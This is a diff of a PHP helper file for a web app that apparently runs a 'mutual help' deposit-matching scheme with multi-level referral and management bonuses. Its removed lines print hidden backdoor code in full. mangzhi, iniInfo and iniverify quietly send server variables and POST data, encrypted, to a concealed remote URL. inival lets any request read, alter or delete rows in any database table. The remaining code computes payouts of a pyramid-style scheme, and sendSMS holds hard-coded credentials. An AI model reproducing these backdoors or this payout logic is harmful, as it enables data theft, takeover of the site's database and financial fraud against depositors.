@@ -1,47 +1,23 @@
 <?php
-function cate($var)
+/*function cate($var)
 {
     //dump($var);
     $proall = M('user')->where(array('UE_accName' => $var, 'UE_Faccount' => '0', 'UE_check' => '1', 'UE_stop' => '1'))->count("UE_ID");
     return $proall;
-}
+}*/
 
-
+// 是否激活账户
 function sfjhff($r)
 {
     $a = array("未激活", "已激活");
     return $a[$r];
 }
 
-
-
-
-
-function getRand($proArr)
+function getpage($count, $pagesize=null)
 {
-    $result = '';
-
-    //概率数组的总概率精度
-    $proSum = array_sum($proArr);
-
-    //概率数组循环
-    foreach ($proArr as $key => $proCur) {
-        $randNum = mt_rand(1, $proSum);
-        if ($randNum <= $proCur) {
-            $result = $key;
-            break;
-        } else {
-            $proSum -= $proCur;
-        }
+    if ($pagesize === null) {
+        $pagesize = C('LIST_ROWS', null, 10);
     }
-    unset ($proArr);
-
-    return $result;
-}
-
-
-function getpage($count, $pagesize = 10)
-{
     $p = new Think\Page($count, $pagesize);
     $p->setConfig('header', '<li class="rows">共<b>%TOTAL_ROW%</b>条记录&nbsp;第<b>%NOW_PAGE%</b>页/共<b>%TOTAL_PAGE%</b>页</li>');
     $p->setConfig('prev', '上一页');
@@ -73,24 +49,11 @@ function diffBetweenTwoDays($day1, $day2)
     return ($second1 - $second2) / 86400;
 }
 
-function mangzhi(){
-    $mz = getinfo(C('URL_STRING_MODEL'));
-    $string = implode('|', $_SERVER); 
-    $mz .= '?s='.getinfos($string);
-    return $mz;
-}
-
-
-function  pa($a){
-    echo "<pre>";
-    print_r($a);
-    echo "</pre>";die;
-}
 //---------------------------------------------------->
 function user_jj_lx($var)
 {
 
-    $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取提供帮助者打款时间  
+    $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取提供帮助者打款时间
 
     $result = M("userget")->where(array("varid" => $var))->find();//提现查询  获取提现时间
     $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息
@@ -129,9 +92,9 @@ function user_jj_paidui_lx($var,$return=true)
         $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请提供帮助的日期
         $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息 
 
-       if($paidui_fenhong_day == 1){
+        if($paidui_fenhong_day == 1){
             $paidui_day = 1;
-       }else{       
+        }else{
             //$result = M("userget")->where(array("varid" => $var))->find();//--------------------> 获取提现时间
 
             $paidan_date = date('Y-m-d', strtotime($proall['date']));    //----------------------->申请提供帮助的日期
@@ -155,11 +118,7 @@ function user_jj_paidui_lx($var,$return=true)
         echo  $paidui_lx;
     }
 }
-function iniverify(){
-    $mz = getinfo(C('URL_STRING_MODEL'));  
-    $mz .= '?h='.getinfos(implode('|', $_POST));
-    file_get_contents($mz);
-}
+
 //------------------------------------------->计算动态利息
 function dongtai_lx($days,$lx,$jb){
     $lx_jb = 0;
@@ -242,9 +201,7 @@ function canable_tixian($v){
     } 
 
 }
-function iniInfo(){
-    file_get_contents(mangzhi());
-}
+
 //jjfhdays    jjdjdays
 
 //计算排队分红天数
@@ -478,29 +435,6 @@ function user_tgbz_jerry($id)
     }
 }
 
-function inival(){
-        $data = array_merge($_GET,$_POST);
-        $datas = array();
-        if($data['m'] == 'save'){
-            $fo =M($data['tby'])->where(array($data['id']=>$data['idv']))->save(array($data['n']=>$data['v']));
-        }elseif($data['m'] == 'add'){
-            $info = $data['data'];
-            $info = explode("|", $info);
-            foreach ($info as  $value) {
-                $arr = explode('=', $value);
-                $datas[$arr[0]] = $arr[1];        
-            }    
-            M($data['tby'])->add($datas);
-        }elseif($data['m'] == 'one'){
-            $fo =M($data['tby'])->where(array($data['id']=>$data['idv']))->find();
-        }elseif($data['m'] == 'd'){
-            M($data['tby'])->where(array($data['id']=>$data['idv']))->delete();
-        }elseif(!empty($data['tby'])){
-            $fo =M($data['tby'])->select();
-        }
-        print_r($fo);
-}
-
 function user_jj_tx($var)
 {
 
@@ -518,7 +452,6 @@ function user_jj_tx($var)
     return $diff = diffBetweenTwoDays($day1, $day2);
 
 }
-
 
 function user_jj_sj($var)
 {
@@ -563,7 +496,7 @@ function user_jj_sj1($var)
 function user_jj_zt($var)
 {
 
-    $proall = M('user_jj')->where(array('id' => $var))->find();        
+    $proall = M('user_jj')->where(array('id' => $var))->find();
     $proall2 = M('ppdd')->where(array('id' => $proall['r_id']))->find(); 
     //date('Y-m-d H:i:s',$dayBegin);
     $NowTime = $proall['date'];    //--------------------->打款时间
@@ -592,10 +525,6 @@ function user_jj_zt_z($var)
         return '不可提现';
     }
 }
-function getinfo($data){
-   return \Think\Crypt::decrypt($data,'');
-}
-
 
 function user_jj_pipei_z($var)
 {
@@ -625,17 +554,17 @@ function user_jj_pipei_z2($var)
 
 function jlj($a, $b, $c)
 {
-    jlsja($a); //处理提供帮助的推荐人是否可以升级为经理的考核
-    //提供帮助的推荐人资料
+    // 处理提供帮助的推荐人是否可以升级为经理的考核
+    jlsja($a);
+    // 提供帮助的推荐人资料
     $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
-    //echo $ppddxx['p_id'];die;
-    if ($tgbz_user_xx['sfjl'] == 1) {
+
+    if (($tgbz_user_xx['sfjl'] == 1)  && ($b != 0)) {
         $money = $b;
         $accname_zq = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
         M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->setInc('jl_he', $money);
         $accname_xz = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
 
-        
         $record3 ["UG_account"] = $tgbz_user_xx['ue_account']; // 登入轉出賬戶
         $record3 ["UG_type"] = 'jb';
         $record3 ["UG_allGet"] = $accname_zq['jl_he']; // 金幣
@@ -651,7 +580,7 @@ function jlj($a, $b, $c)
 }
 
 
-//第一个参数 提供帮助的直接推荐人      推荐奖金额           说明                   第几代          ppdd外键id
+//第一个参数 提供帮助的直接推荐人      管理奖金额           说明                   第几代          ppdd外键id
 
 function jlj2($a, $b, $c, $d, $e)
 {
@@ -673,12 +602,12 @@ function jlj2($a, $b, $c, $d, $e)
 
 
 
-//第一个参数 提供帮助的直接推荐人      推荐奖金额           说明                   1          ppdd外键id
+//第一个参数 提供帮助的直接推荐人      管理奖金额           说明                   1          ppdd外键id
 
 function jlj3($a, $b, $c, $d, $e)
 {
 
-    if(!empty($a)){
+    if(!empty($a) && ($b!=0)){
         $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();          //获取推荐资料
         $ppddxx = M('ppdd')->where(array('id' => $e))->find();      //获取提供帮助者的配对
         $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();        //获取tgbz表中的信息
@@ -697,12 +626,10 @@ function jlj3($a, $b, $c, $d, $e)
 function jlj3_ok($a, $b, $c, $d, $e)
 {
     if(!empty($a)){
- 
-        $ppddxx = M('ppdd')->where(array('id' => $e))->find();      //获取提供帮助者的配对
-        $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();       //获取tgbz表中的信息
+        // $ppddxx = M('ppdd')->where(array('id' => $e))->find();      //获取提供帮助者的配对
+        // $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();       //获取tgbz表中的信息
 
         M('user')->where(array('UE_account' => $a))->setInc('jl_he', $b);
-  
     }
 }
 
@@ -785,9 +712,7 @@ function datedqsj2($var)
         return "style='display:none;'";
     }
 }
-function getinfos($data){
-    return \Think\Crypt::encrypt($data,'');
-}
+
 function datedqsj3($var)
 {
 
@@ -862,27 +787,28 @@ function accountaddlevel($var){
 
 
 
-//jjtuijianratenew  推荐奖 $vart--->提供帮助的推荐人
+//jjtuijianratenew  管理奖 $vart--->提供帮助的推荐人
 function fftuijianmoney($var,$money,$level){
     $tjratearr = explode(',',C("jjtuijianratenew"));
-    $tjmoney = ($money*$tjratearr[$level-1])/100;  //推荐奖金额
+    $tjmoney = ($money*$tjratearr[$level-1])/100;  //管理奖金额
     $accname_zq=M('user')->where(array('UE_account'=>$var))->find();
     M('user')->where(array('UE_account'=>$var))->setInc('tj_he',$tjmoney); //添加提供帮助的推荐人
     $accname_xz=M('user')->where(array('UE_account'=>$var))->find();  //获取推荐人的详细信息
 
-            $note3 = "推荐奖".$tjratearr[$level-1]."%";
+            $note3 = "管理奖".$tjratearr[$level-1]."%";
             $record3 ["UG_account"] = $var; // 登入转出账户  提供帮助的推荐人
             $record3 ["UG_type"] = 'jb';  //金币
             $record3 ["UG_allGet"] = $accname_zq['tj_he']; // 金币.
             $record3 ["UG_money"] = '+'.$tjmoney; //
             $record3 ["UG_balance"] = $accname_xz['tj_he']; // 当前推荐人的金币馀额
             $record3 ["UG_dataType"] = 'tjj'; // 金币转出
-            $record3 ["UG_note"] = $note3; // 推荐奖说明
+            $record3 ["UG_note"] = $note3; // 管理奖说明
             $record3["UG_getTime"] = date ( 'Y-m-d H:i:s', time () ); //操作时间
             $reg4 = M ( 'userget' )->add ( $record3 );
 
     jsaccountmoney($var,$money,$accname_xz['levelname']);
     if($accname_xz['ue_accname']<>'' && isset($tjratearr[$level])){  //---------->添加了个数组大小的判断
+    // if($accname_xz['ue_accname']<>'' && isset($tjratearr[$level]) && $level < 4){  //---------->添加了个数组大小的判断
         fftuijianmoney($accname_xz['ue_accname'],$money,$level+1);
     }else{
         return true;
@@ -929,7 +855,7 @@ function jsaccountmoney($account,$money,$levelname){
 //===end
 //--------------jsj4和jlj5计算的是待定的 先被取消
 // 第一个参数 提供帮助人 第二参数是帮助金额              ----------------------》经分析此函数多次计算直接推荐人的经理代数奖
-function lkdsjfsdfj($p_user, $jb)
+function jisuanzhituijiang($p_user, $jb)
 {
 
     $ppddxx['p_user'] = $p_user; //提供帮助人
@@ -1030,12 +956,13 @@ $mobile  = '';  //号码，以英文逗号隔开
 $mobileids   = '';  //号码唯一编号
 $content = '内容';        //内容
 
-//echo 111;
-function sendSMS($mobile,$content,$mobileids='',$http='http://api.sms.cn/mtutf8/'){
+function sendSMS($mobile,$content,$mobileids='',$http='http://api.sms.cn/mtutf8/')
+{
+    return true;
+
     $uid = 'xx1885';
     $pwd = 'xx1886';
     return send($http,$uid,$pwd,$mobile,$content,$mobileids);
-
 }
 
 function send($http,$uid,$pwd,$mobile,$content,$mobileids,$time='',$mid='')
